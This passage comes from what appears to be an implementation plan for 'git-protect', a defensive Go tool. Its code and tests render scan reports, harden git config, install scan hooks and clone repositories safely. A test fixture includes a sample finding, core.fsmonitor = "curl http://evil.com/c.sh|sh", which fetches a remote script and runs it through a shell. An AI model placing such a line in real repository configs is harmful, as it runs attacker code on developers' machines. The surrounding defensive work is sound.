		ok, err := s.IsTrusted(url)
		if err != nil {
			t.Fatalf("IsTrusted(%q): %v", url, err)
		}
		if !ok {
			t.Errorf("IsTrusted(%q) = false, want true", url)
		}
	}
	for _, url := range untrusted {
		ok, err := s.IsTrusted(url)
		if err != nil {
			t.Fatalf("IsTrusted(%q): %v", url, err)
		}
		if ok {
			t.Errorf("IsTrusted(%q) = true, want false", url)
		}
	}
}

func TestStoreLocalPathsAlwaysUntrusted(t *testing.T) {
	s, _ := newTempStore(t)

	// Even with a wildcard that would theoretically match
	_ = s.Add(trust.Entry{Pattern: "*", Type: "host"})

	localPaths := []string{
		"/home/user/repo",
		"./repo",
		"file:///tmp/myrepo",
	}
	for _, p := range localPaths {
		ok, err := s.IsTrusted(p)
		if err != nil {
			t.Fatalf("IsTrusted(%q): %v", p, err)
		}
		if ok {
			t.Errorf("local path %q should never be trusted", p)
		}
	}
}
```

### `internal/trust/match_test.go`

```go
package trust_test

import (
	"testing"

	"github.com/moldabekov/git-protect/internal/trust"
)

func TestMatch(t *testing.T) {
	tests := []struct {
		url     string
		pattern string
		want    bool
	}{
		// Exact matches
		{"github.com/org/repo", "github.com/org/repo", true},
		{"github.com/org/repo", "github.com/org/other", false},
		{"github.com/org/repo", "github.com/org/rep", false},
		// Org wildcard
		{"github.com/myorg/repo", "github.com/myorg/*", true},
		{"github.com/myorg/another", "github.com/myorg/*", true},
		{"github.com/myorg", "github.com/myorg/*", true}, // prefix itself
		{"github.com/other/repo", "github.com/myorg/*", false},
		// Host wildcard
		{"gitlab.internal.corp/team/repo", "gitlab.internal.corp/*", true},
		{"gitlab.internal.corp/a/b/c", "gitlab.internal.corp/*", true},
		{"evil.corp/team/repo", "gitlab.internal.corp/*", false},
		// Case insensitivity
		{"GITHUB.COM/Org/Repo", "github.com/org/repo", true},
		// Wildcard should not match cross-host
		{"evilgithub.com/myorg/repo", "github.com/myorg/*", false},
	}

	for _, tt := range tests {
		got := trust.Match(tt.url, tt.pattern)
		if got != tt.want {
			t.Errorf("Match(%q, %q) = %v, want %v", tt.url, tt.pattern, got, tt.want)
		}
	}
}
```

---

## Task 17: Report Output

### `internal/output/report.go`

```go
package output

import (
	"encoding/json"
	"fmt"
	"io"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// RenderText writes a human-readable report to w. Only findings at or above
// minSeverity are printed. Each line is prefixed with the severity label.
func RenderText(w io.Writer, report scanner.Report, minSeverity scanner.Severity) {
	findings := report.AtOrAbove(minSeverity)
	if len(findings) == 0 {
		return
	}
	for _, f := range findings {
		location := f.Path
		if location == "" {
			location = f.Module
		}
		if f.Detail != "" {
			fmt.Fprintf(w, "%-10s %s: %s (%s)\n", f.Severity.String(), location, f.Message, f.Detail)
		} else {
			fmt.Fprintf(w, "%-10s %s: %s\n", f.Severity.String(), location, f.Message)
		}
	}
}

// jsonFinding is the wire format for a single finding in JSON output.
type jsonFinding struct {
	Severity string `json:"severity"`
	Module   string `json:"module"`
	Path     string `json:"path,omitempty"`
	Message  string `json:"message"`
	Detail   string `json:"detail,omitempty"`
}

// jsonReport is the top-level JSON envelope.
type jsonReport struct {
	Findings []jsonFinding `json:"findings"`
	Blocking bool          `json:"blocking"`
	Count    int           `json:"count"`
}

// RenderJSON writes a machine-readable JSON report to w.
// The output always includes a "findings" array, "blocking" bool, and "count" int.
func RenderJSON(w io.Writer, report scanner.Report) error {
	jr := jsonReport{
		Blocking: report.HasBlocking(),
		Count:    len(report.Findings),
		Findings: make([]jsonFinding, 0, len(report.Findings)),
	}
	for _, f := range report.Findings {
		jr.Findings = append(jr.Findings, jsonFinding{
			Severity: f.Severity.String(),
			Module:   f.Module,
			Path:     f.Path,
			Message:  f.Message,
			Detail:   f.Detail,
		})
	}
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	return enc.Encode(jr)
}
```

### `internal/output/report_test.go`

```go
package output_test

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/output"
	"github.com/moldabekov/git-protect/internal/scanner"
)

func sampleReport() scanner.Report {
	return scanner.Report{
		Findings: []scanner.Finding{
			{
				Severity: scanner.Critical,
				Module:   "config",
				Path:     ".git/config",
				Message:  `core.fsmonitor = "curl http://evil.com/c.sh|sh"`,
				Detail:   "executes on git status",
			},
			{
				Severity: scanner.High,
				Module:   "ide-configs",
				Path:     ".vscode/tasks.json",
				Message:  `task "setup" has runOn: folderOpen`,
			},
			{
				Severity: scanner.Medium,
				Module:   "scripts",
				Path:     "scripts/setup.sh",
				Message:  "contains curl to external URL",
			},
			{
				Severity: scanner.Info,
				Module:   "ci-pipelines",
				Path:     ".github/workflows/ci.yml",
				Message:  "workflow found",
			},
		},
	}
}

func TestRenderText_NonEmpty(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, sampleReport(), scanner.Info)
	out := buf.String()
	if out == "" {
		t.Fatal("RenderText output is empty")
	}
	if !strings.Contains(out, "CRITICAL") {
		t.Error("expected CRITICAL in output")
	}
	if !strings.Contains(out, "HIGH") {
		t.Error("expected HIGH in output")
	}
	if !strings.Contains(out, "MEDIUM") {
		t.Error("expected MEDIUM in output")
	}
	if !strings.Contains(out, "INFO") {
		t.Error("expected INFO in output")
	}
}

func TestRenderText_SeverityFilter(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, sampleReport(), scanner.High)
	out := buf.String()

	if !strings.Contains(out, "CRITICAL") {
		t.Error("expected CRITICAL in output when min=HIGH")
	}
	if !strings.Contains(out, "HIGH") {
		t.Error("expected HIGH in output when min=HIGH")
	}
	if strings.Contains(out, "MEDIUM") {
		t.Error("unexpected MEDIUM in output when min=HIGH")
	}
	if strings.Contains(out, "INFO") {
		t.Error("unexpected INFO in output when min=HIGH")
	}
}

func TestRenderText_EmptyReport(t *testing.T) {
	var buf bytes.Buffer
	output.RenderText(&buf, scanner.Report{}, scanner.Info)
	if buf.Len() != 0 {
		t.Errorf("expected empty output for empty report, got %q", buf.String())
	}
}

func TestRenderJSON_ValidParse(t *testing.T) {
	var buf bytes.Buffer
	err := output.RenderJSON(&buf, sampleReport())
	if err != nil {
		t.Fatalf("RenderJSON error: %v", err)
	}

	var parsed struct {
		Findings []struct {
			Severity string `json:"severity"`
			Module   string `json:"module"`
			Path     string `json:"path"`
			Message  string `json:"message"`
		} `json:"findings"`
		Blocking bool `json:"blocking"`
		Count    int  `json:"count"`
	}
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatalf("JSON parse error: %v\noutput: %s", err, buf.String())
	}

	if !parsed.Blocking {
		t.Error("expected blocking=true")
	}
	if parsed.Count != 4 {
		t.Errorf("count = %d, want 4", parsed.Count)
	}
	if len(parsed.Findings) != 4 {
		t.Errorf("findings length = %d, want 4", len(parsed.Findings))
	}
	if parsed.Findings[0].Severity != "CRITICAL" {
		t.Errorf("first finding severity = %q, want CRITICAL", parsed.Findings[0].Severity)
	}
}

func TestRenderJSON_NonBlocking(t *testing.T) {
	report := scanner.Report{
		Findings: []scanner.Finding{
			{Severity: scanner.Medium, Module: "scripts", Message: "curl found"},
		},
	}
	var buf bytes.Buffer
	if err := output.RenderJSON(&buf, report); err != nil {
		t.Fatal(err)
	}
	var parsed struct {
		Blocking bool `json:"blocking"`
		Count    int  `json:"count"`
	}
	if err := json.Unmarshal(buf.Bytes(), &parsed); err != nil {
		t.Fatal(err)
	}
	if parsed.Blocking {
		t.Error("expected blocking=false for MEDIUM-only report")
	}
	if parsed.Count != 1 {
		t.Errorf("count = %d, want 1", parsed.Count)
	}
}
```

---

## Task 18: Git Config Hardening

### `internal/gitcfg/hardening.go`

```go
package gitcfg

import (
	"fmt"
	"os/exec"
	"strings"
)

// ConfigEntry describes one global git config setting managed by git-protect.
type ConfigEntry struct {
	Key         string
	Value       string
	Overridable bool   // true = local .git/config can override this
	Purpose     string // human-readable description
}

// HardeningEntries returns the six config entries that git-protect install applies.
// This list is the authoritative definition — install, uninstall, and status
// all derive from it.
func HardeningEntries() []ConfigEntry {
	return []ConfigEntry{
		{
			Key:         "core.hooksPath",
			Overridable: true,
			Purpose:     "Redirect hooks to git-protect managed directory (best-effort; can be overridden by local config)",
			// Value is set at install time to the actual hooks dir path.
		},
		{
			Key:         "safe.bareRepository",
			Value:       "explicit",
			Overridable: false,
			Purpose:     "Block embedded bare repo attacks (protected config; cannot be overridden by local config)",
		},
		{
			Key:         "core.fsmonitor",
			Value:       "false",
			Overridable: true,
			Purpose:     "Disable fsmonitor to prevent RCE via core.fsmonitor (best-effort; can be overridden)",
		},
		{
			Key:         "transfer.fsckObjects",
			Value:       "true",
			Overridable: true,
			Purpose:     "Validate git object integrity during fetch (best-effort; can be overridden)",
		},
		{
			Key:         "core.protectHFS",
			Value:       "true",
			Overridable: true,
			Purpose:     "Prevent HFS+ Unicode normalization attacks on macOS (best-effort)",
		},
		{
			Key:         "core.protectNTFS",
			Value:       "true",
			Overridable: true,
			Purpose:     "Prevent NTFS alternate data stream attacks on Windows (best-effort)",
		},
	}
}

// SetGlobal runs: git config --global <key> <value>
func SetGlobal(key, value string) error {
	cmd := exec.Command("git", "config", "--global", key, value)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("git config --global %s %s: %w\n%s", key, value, err, strings.TrimSpace(string(out)))
	}
	return nil
}

// GetGlobal runs: git config --global --get <key>
// Returns ("", nil) if the key is not set.
func GetGlobal(key string) (string, error) {
	cmd := exec.Command("git", "config", "--global", "--get", key)
	out, err := cmd.Output()
	if err != nil {
		// exit status 1 means "key not found" — not an error for our purposes
		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
			return "", nil
		}
		return "", fmt.Errorf("git config --global --get %s: %w", key, err)
	}
	return strings.TrimRight(string(out), "\n"), nil
}

// UnsetGlobal runs: git config --global --unset <key>
// Returns nil if the key was not set (idempotent).
func UnsetGlobal(key string) error {
	cmd := exec.Command("git", "config", "--global", "--unset", key)
	out, err := cmd.CombinedOutput()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 5 {
			// exit 5 = "key not found" — idempotent OK
			return nil
		}
		return fmt.Errorf("git config --global --unset %s: %w\n%s", key, err, strings.TrimSpace(string(out)))
	}
	return nil
}
```

### `internal/gitcfg/hardening_test.go`

```go
package gitcfg_test

import (
	"testing"

	"github.com/moldabekov/git-protect/internal/gitcfg"
)

func TestHardeningEntries_Count(t *testing.T) {
	entries := gitcfg.HardeningEntries()
	if len(entries) != 6 {
		t.Errorf("HardeningEntries() returned %d entries, want 6", len(entries))
	}
}

func TestHardeningEntries_Keys(t *testing.T) {
	entries := gitcfg.HardeningEntries()
	expected := map[string]bool{
		"core.hooksPath":      true,
		"safe.bareRepository": true,
		"core.fsmonitor":      true,
		"transfer.fsckObjects": true,
		"core.protectHFS":     true,
		"core.protectNTFS":    true,
	}
	for _, e := range entries {
		if !expected[e.Key] {
			t.Errorf("unexpected key %q in hardening entries", e.Key)
		}
		delete(expected, e.Key)
	}
	for missing := range expected {
		t.Errorf("missing key %q in hardening entries", missing)
	}
}

func TestHardeningEntries_OverridableFlags(t *testing.T) {
	entries := gitcfg.HardeningEntries()
	byKey := make(map[string]gitcfg.ConfigEntry)
	for _, e := range entries {
		byKey[e.Key] = e
	}

	// Only safe.bareRepository is NOT overridable (protected config)
	if byKey["safe.bareRepository"].Overridable {
		t.Error("safe.bareRepository should not be overridable (protected config)")
	}
	// All others should be overridable (best-effort)
	overridable := []string{
		"core.hooksPath",
		"core.fsmonitor",
		"transfer.fsckObjects",
		"core.protectHFS",
		"core.protectNTFS",
	}
	for _, key := range overridable {
		if !byKey[key].Overridable {
			t.Errorf("%s should be overridable", key)
		}
	}
}

func TestHardeningEntries_PurposeNonEmpty(t *testing.T) {
	for _, e := range gitcfg.HardeningEntries() {
		if e.Purpose == "" {
			t.Errorf("entry %q has empty Purpose", e.Key)
		}
	}
}

func TestHardeningEntries_ValuesSet(t *testing.T) {
	entries := gitcfg.HardeningEntries()
	byKey := make(map[string]gitcfg.ConfigEntry)
	for _, e := range entries {
		byKey[e.Key] = e
	}
	// Entries with known values
	checks := map[string]string{
		"safe.bareRepository":  "explicit",
		"core.fsmonitor":       "false",
		"transfer.fsckObjects": "true",
		"core.protectHFS":      "true",
		"core.protectNTFS":     "true",
	}
	for key, want := range checks {
		if got := byKey[key].Value; got != want {
			t.Errorf("entry %q value = %q, want %q", key, got, want)
		}
	}
}
```

---

## Task 19: Hook Manager

### `internal/hooks/manager.go`

```go
package hooks

import (
	"fmt"
	"os"
	"path/filepath"
)

// hookNames are the three git hooks installed by git-protect.
var hookNames = []string{"post-checkout", "post-merge", "post-rewrite"}

// hookScript generates the shell script body for a given hook.
// The script execs the git-protect binary with scan --hook-mode.
// Using exec avoids keeping a parent shell process alive.
func hookScript(binaryPath string) string {
	return fmt.Sprintf(`#!/bin/sh
# Installed by git-protect. Do not edit manually.
# Scans the repository after git operations for security threats.
exec "%s" scan --hook-mode "$@"
`, binaryPath)
}

// Install creates the hooks directory and writes post-checkout, post-merge,
// and post-rewrite hook scripts. Each script is set executable (0755).
// Install is idempotent — running it again overwrites existing hook files.
func Install(hooksDir, binaryPath string) error {
	if err := os.MkdirAll(hooksDir, 0755); err != nil {
		return fmt.Errorf("hooks: create directory %q: %w", hooksDir, err)
	}

	script := hookScript(binaryPath)
	for _, name := range hookNames {
		hookPath := filepath.Join(hooksDir, name)
		// Write with 0755 from the start
		if err := os.WriteFile(hookPath, []byte(script), 0755); err != nil {
			return fmt.Errorf("hooks: write %q: %w", hookPath, err)
		}
	}
	return nil
}

// Uninstall removes all three hook files from hooksDir.
// Returns nil if the files do not exist (idempotent).
func Uninstall(hooksDir string) error {
	for _, name := range hookNames {
		hookPath := filepath.Join(hooksDir, name)
		if err := os.Remove(hookPath); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("hooks: remove %q: %w", hookPath, err)
		}
	}
	return nil
}

// HookNames returns a copy of the managed hook names.
func HookNames() []string {
	result := make([]string, len(hookNames))
	copy(result, hookNames)
	return result
}
```

### `internal/hooks/manager_test.go`

```go
package hooks_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/hooks"
)

func TestInstall_CreatesAllThreeHooks(t *testing.T) {
	dir := t.TempDir()
	binaryPath := "/usr/local/bin/git-protect"

	if err := hooks.Install(dir, binaryPath); err != nil {
		t.Fatalf("Install: %v", err)
	}

	expected := []string{"post-checkout", "post-merge", "post-rewrite"}
	for _, name := range expected {
		hookPath := filepath.Join(dir, name)
		if _, err := os.Stat(hookPath); os.IsNotExist(err) {
			t.Errorf("hook %q was not created", hookPath)
		}
	}
}

func TestInstall_HooksAreExecutable(t *testing.T) {
	dir := t.TempDir()
	binaryPath := "/usr/local/bin/git-protect"

	if err := hooks.Install(dir, binaryPath); err != nil {
		t.Fatalf("Install: %v", err)
	}

	for _, name := range []string{"post-checkout", "post-merge", "post-rewrite"} {
		hookPath := filepath.Join(dir, name)
		info, err := os.Stat(hookPath)
		if err != nil {
			t.Fatalf("Stat %q: %v", hookPath, err)
		}
		if info.Mode().Perm()&0111 == 0 {
			t.Errorf("hook %q is not executable (mode %04o)", hookPath, info.Mode().Perm())
		}
	}
}

func TestInstall_HooksContainBinaryPath(t *testing.T) {
	dir := t.TempDir()
	binaryPath := "/home/user/.local/bin/git-protect"

	if err := hooks.Install(dir, binaryPath); err != nil {
		t.Fatalf("Install: %v", err)
	}

	hookPath := filepath.Join(dir, "post-checkout")
	content, err := os.ReadFile(hookPath)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if string(content) == "" {
		t.Error("hook file is empty")
	}
	// Binary path must appear in the script
	if !containsString(string(content), binaryPath) {
		t.Errorf("hook script does not contain binary path %q\nscript:\n%s", binaryPath, content)
	}
}

func TestInstall_HooksContainScanHookMode(t *testing.T) {
	dir := t.TempDir()
	if err := hooks.Install(dir, "/usr/bin/git-protect"); err != nil {
		t.Fatalf("Install: %v", err)
	}

	hookPath := filepath.Join(dir, "post-checkout")
	content, err := os.ReadFile(hookPath)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if !containsString(string(content), "--hook-mode") {
		t.Errorf("hook script does not contain --hook-mode:\n%s", content)
	}
	if !containsString(string(content), "scan") {
		t.Errorf("hook script does not contain 'scan':\n%s", content)
	}
}

func TestInstall_Idempotent(t *testing.T) {
	dir := t.TempDir()
	binaryPath := "/usr/local/bin/git-protect"

	if err := hooks.Install(dir, binaryPath); err != nil {
		t.Fatalf("first Install: %v", err)
	}
	if err := hooks.Install(dir, binaryPath); err != nil {
		t.Fatalf("second Install: %v", err)
	}
}

func TestUninstall_RemovesAllHooks(t *testing.T) {
	dir := t.TempDir()
	if err := hooks.Install(dir, "/usr/bin/git-protect"); err != nil {
		t.Fatalf("Install: %v", err)
	}

	if err := hooks.Uninstall(dir); err != nil {
		t.Fatalf("Uninstall: %v", err)
	}

	for _, name := range []string{"post-checkout", "post-merge", "post-rewrite"} {
		hookPath := filepath.Join(dir, name)
		if _, err := os.Stat(hookPath); !os.IsNotExist(err) {
			t.Errorf("hook %q still exists after Uninstall", hookPath)
		}
	}
}

func TestUninstall_IdempotentWhenEmpty(t *testing.T) {
	dir := t.TempDir()
	// Uninstall on a directory with no hooks should not error
	if err := hooks.Uninstall(dir); err != nil {
		t.Fatalf("Uninstall on empty dir: %v", err)
	}
}

func containsString(haystack, needle string) bool {
	return len(haystack) > 0 && len(needle) > 0 &&
		(len(haystack) >= len(needle)) &&
		findString(haystack, needle)
}

func findString(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
```

---

## Task 20: Safe Clone Engine

### `internal/clone/engine.go`

```go
package clone

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// Result is the outcome of a safe clone operation.
type Result struct {
	PreReport  scanner.Report // findings from pre-checkout scan
	PostReport scanner.Report // findings from post-checkout scan (only if not blocked)
	Blocked    bool           // true if clone was blocked due to threats
	CleanedUp  bool           // true if the cloned directory was removed
	Dir        string         // resolved clone target directory
}

// ScanFunc is a function that scans a repository directory.
// The engine accepts this as a dependency to allow test injection.
type ScanFunc func(ctx context.Context, repoPath string, preCheckout bool) (scanner.Report, error)

// BuildCloneArgs constructs the argument list for git clone. It always adds
// --no-checkout and strips --recurse-submodules (handled separately by the engine).
func BuildCloneArgs(url, dir string, extraArgs []string) []string {
	args := []string{"clone", "--no-checkout"}
	for _, a := range extraArgs {
		// Strip submodule recursion — git-protect handles it separately
		if a == "--recurse-submodules" || strings.HasPrefix(a, "--recurse-submodules=") {
			continue
		}
		args = append(args, a)
	}
	args = append(args, url)
	if dir != "" {
		args = append(args, dir)
	}
	return args
}

// DetectGitBin locates the git binary using PATH resolution.
func DetectGitBin() (string, error) {
	path, err := exec.LookPath("git")
	if err != nil {
		return "", fmt.Errorf("git binary not found in PATH: %w", err)
	}
	return path, nil
}

// inferCloneDir derives the target directory name from a clone URL and explicit
// dir argument, matching git's own logic.
func inferCloneDir(url, dir string) string {
	if dir != "" {
		return dir
	}
	// Strip trailing slashes
	url = strings.TrimRight(url, "/")
	// Take last path segment
	last := filepath.Base(url)
	// Strip .git suffix
	last = strings.TrimSuffix(last, ".git")
	// Handle SCP-style git@host:org/repo
	if idx := strings.LastIndex(last, ":"); idx != -1 {
		last = last[idx+1:]
		last = strings.TrimSuffix(last, ".git")
	}
	return last
}

// Execute performs a safe clone: git clone --no-checkout, pre-scan, checkout,
// post-scan. If blocking threats are found before or after checkout the
// cloned directory is removed and Blocked+CleanedUp are set in the result.
func Execute(
	ctx context.Context,
	gitBin, url, dir string,
	extraArgs []string,
	scan ScanFunc,
) (Result, error) {
	resolvedDir := inferCloneDir(url, dir)
	result := Result{Dir: resolvedDir}

	// Step 1: git clone --no-checkout
	cloneArgs := BuildCloneArgs(url, dir, extraArgs)
	cloneCmd := exec.CommandContext(ctx, gitBin, cloneArgs...)
	cloneCmd.Stdout = os.Stdout
	cloneCmd.Stderr = os.Stderr
	if err := cloneCmd.Run(); err != nil {
		return result, fmt.Errorf("git clone failed: %w", err)
	}

	// Step 2: Pre-checkout scan
	preReport, err := scan(ctx, resolvedDir, true)
	if err != nil {
		return result, fmt.Errorf("pre-checkout scan failed: %w", err)
	}
	result.PreReport = preReport

	// Step 3: Block if threats found
	if preReport.HasBlocking() {
		result.Blocked = true
		if err := os.RemoveAll(resolvedDir); err != nil {
			return result, fmt.Errorf("cleanup after block: %w", err)
		}
		result.CleanedUp = true
		return result, nil
	}

	// Step 4: git checkout
	checkoutCmd := exec.CommandContext(ctx, gitBin, "-C", resolvedDir, "checkout")
	checkoutCmd.Stdout = os.Stdout
	checkoutCmd.Stderr = os.Stderr
	if err := checkoutCmd.Run(); err != nil {
		return result, fmt.Errorf("git checkout failed: %w", err)
	}

	// Step 5: Post-checkout TOCTOU re-verification
	postReport, err := scan(ctx, resolvedDir, false)
	if err != nil {
		return result, fmt.Errorf("post-checkout scan failed: %w", err)
	}
	result.PostReport = postReport

	// Step 6: Block if post-checkout scan found threats
	if postReport.HasBlocking() {
		result.Blocked = true
		if err := os.RemoveAll(resolvedDir); err != nil {
			return result, fmt.Errorf("cleanup after post-checkout block: %w", err)
		}
		result.CleanedUp = true
		return result, nil
	}

	return result, nil
}
```

### `internal/clone/engine_test.go`

```go
package clone_test

import (
	"testing"

	"github.com/moldabekov/git-protect/internal/clone"
)

func TestBuildCloneArgs_Basic(t *testing.T) {
	args := clone.BuildCloneArgs("https://github.com/org/repo.git", "mydir", nil)
	// Must contain "clone" and "--no-checkout"
	if !containsArg(args, "clone") {
		t.Errorf("args missing 'clone': %v", args)
	}
	if !containsArg(args, "--no-checkout") {
		t.Errorf("args missing '--no-checkout': %v", args)
	}
	if !containsArg(args, "https://github.com/org/repo.git") {
		t.Errorf("args missing URL: %v", args)
	}
	if !containsArg(args, "mydir") {
		t.Errorf("args missing target dir: %v", args)
	}
}

func TestBuildCloneArgs_NoDir(t *testing.T) {
	args := clone.BuildCloneArgs("https://github.com/org/repo.git", "", nil)
	// URL present but no explicit dir
	if !containsArg(args, "https://github.com/org/repo.git") {
		t.Errorf("args missing URL: %v", args)
	}
	// "mydir" should not be present since dir=""
	for _, a := range args {
		if a == "mydir" {
			t.Errorf("unexpected 'mydir' in args when dir is empty: %v", args)
		}
	}
}

func TestBuildCloneArgs_WithDepth(t *testing.T) {
	args := clone.BuildCloneArgs("https://github.com/org/repo.git", "", []string{"--depth", "1"})
	if !containsArg(args, "--depth") {
		t.Errorf("args missing '--depth': %v", args)
	}
	if !containsArg(args, "1") {
		t.Errorf("args missing depth value '1': %v", args)
	}
}

func TestBuildCloneArgs_StripsRecurseSubmodules(t *testing.T) {
	extraArgs := []string{"--depth", "1", "--recurse-submodules", "--branch", "main"}
	args := clone.BuildCloneArgs("https://github.com/org/repo.git", "", extraArgs)
	for _, a := range args {
		if a == "--recurse-submodules" {
			t.Errorf("--recurse-submodules should be stripped from clone args: %v", args)
		}
	}
	// Other args should survive
	if !containsArg(args, "--depth") {
		t.Errorf("--depth should be preserved: %v", args)
	}
	if !containsArg(args, "--branch") {
		t.Errorf("--branch should be preserved: %v", args)
	}
}

func TestBuildCloneArgs_StripsRecurseSubmodulesWithValue(t *testing.T) {
	args := clone.BuildCloneArgs("https://example.com/repo.git", "", []string{
		"--recurse-submodules=path/to/sub",
	})
	for _, a := range args {
		if a == "--recurse-submodules=path/to/sub" {
			t.Errorf("--recurse-submodules=... should be stripped: %v", args)
		}
	}
}

func TestBuildCloneArgs_AlwaysHasNoCheckout(t *testing.T) {
	// Even if --no-checkout is NOT in extraArgs it must be present
	args := clone.BuildCloneArgs("https://example.com/repo.git", "", []string{})
	found := false
	for _, a := range args {
		if a == "--no-checkout" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("--no-checkout missing from args: %v", args)
	}
}

func containsArg(args []string, target string) bool {
	for _, a := range args {
		if a == target {
			return true
		}
	}
	return false
}
```

---

## Task 21 + 22: CLI Root, Scan Command, and All Remaining Commands

### `cmd/git-protect/main.go`

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/moldabekov/git-protect/internal/clone"
	"github.com/moldabekov/git-protect/internal/gitcfg"
	"github.com/moldabekov/git-protect/internal/hooks"
	"github.com/moldabekov/git-protect/internal/output"
	"github.com/moldabekov/git-protect/internal/paths"
	"github.com/moldabekov/git-protect/internal/scanner"
	"github.com/moldabekov/git-protect/internal/trust"

	// Detection modules
	scannerImpl "github.com/moldabekov/git-protect/internal/scanner"
)

// version is set at build time via -ldflags.
var version = "dev"

// ---- Module registration ----

// allModules registers all 13 scanner modules with the given engine.
// The order here determines the order findings appear in reports.
func allModules(e *scannerImpl.Engine) {
	e.Register(&scannerImpl.HooksModule{})
	e.Register(&scannerImpl.ConfigModule{})
	e.Register(&scannerImpl.ConfigIncludeModule{})
	e.Register(&scannerImpl.AttributesModule{})
	e.Register(&scannerImpl.SubmodulesModule{})
	e.Register(&scannerImpl.SymlinksModule{})
	e.Register(&scannerImpl.BareReposModule{})
	e.Register(&scannerImpl.IDEConfigsModule{})
	e.Register(&scannerImpl.DevEnvModule{})
	e.Register(&scannerImpl.ScriptsModule{})
	e.Register(&scannerImpl.BuildHooksModule{})
	e.Register(&scannerImpl.UnicodeModule{})
	e.Register(&scannerImpl.PipelinesModule{})
}

// ---- Severity parsing ----

func parseSeverity(s string) (scanner.Severity, error) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "critical":
		return scanner.Critical, nil
	case "high":
		return scanner.High, nil
	case "medium":
		return scanner.Medium, nil
	case "info":
		return scanner.Info, nil
	default:
		return scanner.Info, fmt.Errorf("unknown severity %q (valid: critical, high, medium, info)", s)
	}
}

// ---- Root command ----

func buildRoot() *cobra.Command {
	root := &cobra.Command{
		Use:   "git-protect",
		Short: "Protect against malicious git repositories",
		Long: `git-protect scans git repositories for attack patterns before they can execute.

It provides three defense layers:
  1. Safe clone wrapper (git-protect clone) — primary defense, blocks before checkout
  2. Global git hooks — secondary defense, warns on every checkout
  3. Git config hardening — best-effort fallback`,
		SilenceUsage:  true,
		SilenceErrors: true,
	}

	root.AddCommand(buildVersionCmd())
	root.AddCommand(buildScanCmd())
	root.AddCommand(buildInstallCmd())
	root.AddCommand(buildUninstallCmd())
	root.AddCommand(buildCloneCmd())
	root.AddCommand(buildTrustCmd())
	root.AddCommand(buildStatusCmd())

	return root
}

// ---- version command ----

func buildVersionCmd() *cobra.Command {
	var checkUpdate bool

	cmd := &cobra.Command{
		Use:   "version",
		Short: "Print version information",
		RunE: func(cmd *cobra.Command, args []string) error {
			fmt.Fprintf(os.Stdout, "git-protect %s (%s, %s/%s)\n",
				version, runtime.Version(), runtime.GOOS, runtime.GOARCH)

			if checkUpdate && os.Getenv("GIT_PROTECT_NO_UPDATE_CHECK") == "" {
				checkForUpdate(os.Stdout, version)
			}
			return nil
		},
	}

	cmd.Flags().BoolVar(&checkUpdate, "check", false, "Check for newer releases on GitHub")
	return cmd
}

// checkForUpdate fetches the latest release from GitHub Releases API and
// prints an update notice if a newer version is available. Fails silently.
func checkForUpdate(w io.Writer, currentVersion string) {
	const apiURL = "https://api.github.com/repos/moldabekov/git-protect/releases/latest"
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, apiURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	var release struct {
		TagName string `json:"tag_name"`
		HTMLURL string `json:"html_url"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		return
	}

	latest := strings.TrimPrefix(release.TagName, "v")
	current := strings.TrimPrefix(currentVersion, "v")
	if latest != "" && latest != current && latest != "dev" {
		fmt.Fprintf(w, "Latest: %s — update available at %s\n", release.TagName, release.HTMLURL)
	}
}

// ---- scan command ----

func buildScanCmd() *cobra.Command {
	var (
		jsonOut      bool
		verbose      bool
		severityStr  string
		modulesStr   string
		exitCode     bool
		hookMode     bool
	)

	cmd := &cobra.Command{
		Use:   "scan [dir]",
		Short: "Scan a repository for security threats",
		Args:  cobra.MaximumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			dir := "."
			if len(args) > 0 {
				dir = args[0]
			}

			minSeverity := scanner.Info
			if verbose {
				minSeverity = scanner.Info
			}
			if severityStr != "" {
				sev, err := parseSeverity(severityStr)
				if err != nil {
					return err
				}
				minSeverity = sev
			}
			if hookMode && severityStr == "" {
				// In hook mode, show medium+ by default to reduce noise
				minSeverity = scanner.Medium
			}

			var onlyModules []string
			if modulesStr != "" {
				for _, m := range strings.Split(modulesStr, ",") {
					m = strings.TrimSpace(m)
					if m != "" {
						onlyModules = append(onlyModules, m)
					}
				}
			}

			e := scanner.NewEngine()
			allModules(e)

			sc := scanner.ScanContext{
				RepoPath:    dir,
				PreCheckout: false,
			}

			var report scanner.Report
			var err error
			if len(onlyModules) > 0 {
				report, err = e.ScanModules(context.Background(), sc, onlyModules)
			} else {
				report, err = e.Scan(context.Background(), sc)
			}
			if err != nil {
				return fmt.Errorf("scan: %w", err)
			}

			if jsonOut {
				return output.RenderJSON(os.Stdout, report)
			}

